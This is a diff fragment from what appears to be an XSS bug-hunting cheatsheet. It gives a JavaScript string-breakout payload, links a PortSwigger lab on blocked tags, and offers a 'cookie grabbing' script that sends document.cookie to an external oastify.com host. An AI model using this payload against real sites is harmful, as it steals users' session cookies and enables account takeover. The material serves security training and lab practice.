@@ -76,7 +76,7 @@ xss';alert(1);'xss
 Finally the code will look like this after response.
 ![Screenshot from 2024-06-23 19-29-18](https://github.com/cyb0rg71/Bug-Hunting-Cheatsheet/assets/118939850/5387641e-5ee7-4dca-89a3-e1253a426bc5)
 # Reflected XSS into HTML context with most tags and attributes blocked
-https://github.com/cyb0rg71/Bug-Hunting-Cheatsheet/assets/118939850/87049e1f-644a-4720-8a89-464c320727bf
+<a href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked"></a>
 #### For cookie grabbing.
 ```js
 <script>document.location='https://r91uwnam29s3c1jdsyc8t7t34ualyfm4.oastify.com//'+document.cookie</script> 
